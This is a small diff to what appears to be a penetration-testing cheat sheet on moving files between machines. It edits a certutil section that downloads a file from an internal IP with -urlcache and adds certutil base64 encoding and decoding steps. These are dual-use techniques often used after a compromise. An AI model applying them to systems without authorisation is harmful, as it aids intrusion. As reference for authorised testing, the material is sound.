@@ -85,9 +85,13 @@ USING CERTUTIL -
     
     certutil.exe -urlcache -split -f "http://10.10.10.10/demo.txt" demo.txt
 
-**Web Content Download**
+**encode content to base64**
 
-    certutil.exe -encode c:1.txt out.b64 & more .\out.b64
+    certutil.exe -encode c:demo.txt out.b64 & more .\out.b64
+
+**decode with this command / or use online base64 decoder**
+
+    echo "base64_value==" | base64 -d > demo.txt
 
 ------------------------------------------------------------------------------------------------------------------
 USING SMB - 
